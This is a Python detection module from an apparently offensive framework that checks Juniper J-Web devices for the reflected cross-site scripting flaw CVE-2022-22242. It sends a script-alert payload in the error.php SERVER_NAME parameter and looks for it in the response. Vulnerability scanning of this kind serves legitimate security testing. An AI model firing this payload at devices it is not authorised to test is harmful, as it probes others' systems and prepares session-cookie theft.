#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Juniper Web Device Manager (J-Web) in Junos OS contains a cross-site scripting vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Juniper Web Device Manager - Cross-Site Scripting Detection',
        'description': "Juniper Web Device Manager (J-Web) in Junos OS contains a cross-site scripting vulnerability. This can allow an unauthenticated attacker to run malicious scripts reflected off J-Web to the victim's browser in the context of their session within J-Web, which can allow the attacker to steal cookie-based authentication credentials and launch other attacks. This issue affects all versions prior to 19.1R3-S9; 19.2 versions prior to 19.2R3-S6; 19.3 versions prior to 19.3R3-S7; 19.4 versions prior to 19.4R2-S7, 19.4R3-S8; 20.1 versions prior to 20.1R3-S5; 20.2 versions prior to 20.2R3-S5; 20.3 versions prior to 20.3R3-S5; 20.4 versions prior to 20.4R3-S4; 21.1 versions prior to 21.1R3-S4; 21.2 versions prior to 21.2R3-S1; 21.3 versions prior to 21.3R3; 21.4 versions prior to 21.4R2; 22.1 versions prior to 22.1R2.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'juniper', 'junos', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://octagon.net/blog/2022/10/28/juniper-sslvpn-junos-rce-and-multiple-vulnerabilities/',
            'https://supportportal.juniper.net/s/article/2022-10-Security-Bulletin-Junos-OS-Multiple-vulnerabilities-in-J-Web?language=en_US',
            'https://kb.juniper.net/JSA69899',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-22242',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-22242',
    }

    def run(self):
        r = self.http_request(method="GET", path='/error.php?SERVER_NAME=<script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'The requested resource is not authorized to view',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Juniper Web Device Manager - Cross-Site Scripting detected",
                path='/error.php?SERVER_NAME=<script>alert(document.domain)</script>',
            )
            return True
        return False

